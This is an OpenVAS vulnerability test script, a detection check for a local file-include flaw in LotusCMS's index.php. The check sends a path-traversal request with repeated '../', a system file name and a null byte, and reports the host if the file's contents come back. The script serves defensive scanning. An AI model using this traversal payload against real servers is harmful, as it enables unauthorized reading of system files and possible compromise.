###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lotuscms_45745.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# LotusCMS 'index.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "LotusCMS is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and to execute arbitrary local scripts in
the context of the webserver process. This may allow the attacker
to compromise the application and the computer; other attacks are
also possible.

LotusCMS Fraise 3.0 is vulnerable; other versions may also be
affected.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103023");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-01-11 12:59:27 +0100 (Tue, 11 Jan 2011)");
 script_bugtraq_id(45745);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_name("LotusCMS 'index.php' Local File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45745");
 script_xref(name : "URL" , value : "http://www.lotuscms.org/?page=download");
 script_xref(name : "URL" , value : "http://www.lotuscms.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/lcms", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir, "/index.php?system=",crap(data:"../",length:3*9),files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
